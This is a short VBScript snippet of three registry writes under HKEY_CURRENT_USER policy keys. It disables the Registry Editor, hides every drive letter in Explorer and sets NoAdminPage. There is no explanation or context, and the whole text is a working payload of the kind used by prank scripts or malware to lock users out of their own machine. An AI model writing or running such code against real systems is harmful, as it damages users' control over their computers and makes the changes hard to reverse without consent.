CreateObject("Wscript.shell").regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
CreateObject("Wscript.shell").regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", 67108863, "REG_DWORD"
CreateObject("Wscript.shell").regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoAdminPage", 1, "REG_DWORD"
